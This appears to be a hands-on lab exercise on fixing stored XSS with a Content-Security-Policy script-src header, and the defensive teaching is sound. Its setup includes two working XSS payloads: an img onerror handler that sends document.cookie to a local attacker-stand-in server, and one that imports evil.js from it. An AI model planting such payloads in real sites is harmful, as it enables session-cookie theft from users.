# Exercise 4 — Stored XSS root cause (CSP `script-src`)

## Goal

Stop the injected script from running at all, instead of just limiting what
it can steal.

## Setup

All four servers running, with exercise 3's planted entry still on the board
(re-post it if you reset the message list):

```html
<img src="x" onerror="new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);">
```

You can also try the external-script variant:

```html
<img src="x" onerror="import('http://127.0.0.1:5000/evil.js')">
```

## Watch the attack succeed

1. Reload http://localhost:3000. The script still runs — check
   http://127.0.0.1:5000/captured for a new `beacon-hit`. Even with
   exercise 3's `HttpOnly` fix in place, the captured value is just empty,
   not *absent* — the script still executed.

## Why this works

`demo/servers/frontend-server/headers.js` sends no `Content-Security-Policy`
header at all, so the browser has no restriction on which scripts may run:
inline `<script>` tags and scripts loaded from any origin are all fair game.

## Fix it

Edit `demo/servers/frontend-server/headers.js` to send:

```js
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self'; connect-src 'self' http://localhost:4000 http://localhost:4001"
);
```

Restart `frontend-server` (or the whole stack).

Note the `connect-src`: the real app's own JS calls `login-server` and
`api-server` cross-origin via `fetch()`. Without explicitly allowing those
two origins in `connect-src`, CSP would also block the *legitimate* app, not
just the attack.

## Confirm the fix

1. Reload http://localhost:3000. Login, listing, and posting messages should
   all still work — that's `connect-src` doing its job.
2. The planted `<script>` entry no longer executes. Open the browser
   console — you should see a CSP violation reported for the inline script
   (and, for the `evil.js` variant, for loading a script from
   `http://127.0.0.1:5000`).
3. Check http://127.0.0.1:5000/captured — no new `beacon-hit` is recorded no
   matter how many times you reload. `HttpOnly` (exercise 3) is now visibly
   redundant-but-still-good defense-in-depth — CSP fixed the root cause.

## Key takeaway

CSP's `script-src` is the actual fix for stored XSS: it stops injected
scripts from executing in the first place, rather than limiting what an
already-running script can access (that was `HttpOnly`'s job).
